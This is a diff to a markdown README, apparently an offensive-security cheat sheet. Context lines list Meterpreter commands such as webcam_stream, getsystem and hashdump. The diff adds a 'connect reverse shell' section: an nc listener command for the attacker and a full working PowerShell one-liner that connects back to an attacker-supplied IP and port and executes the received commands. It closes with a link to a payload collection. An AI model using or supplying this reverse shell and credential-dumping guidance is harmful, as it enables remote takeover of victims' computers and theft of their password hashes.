@@ -329,3 +329,16 @@ Here’s how you can organize the commands into tables for your GitHub README fi
 | `webcam_stream`| Plays a video stream from the specified webcam       |
 | `getsystem`    | Attempts to elevate your privilege to that of local system |
 | `hashdump`     | Dumps the contents of the SAM database               |
+
+
+## connect reverse shell
+
+- `nc -nvlp 443` in attacker machine.
+- run the below command in the target system, just replace `<ip>,<port>`.
+```
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+payload all the things
+```
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
+```
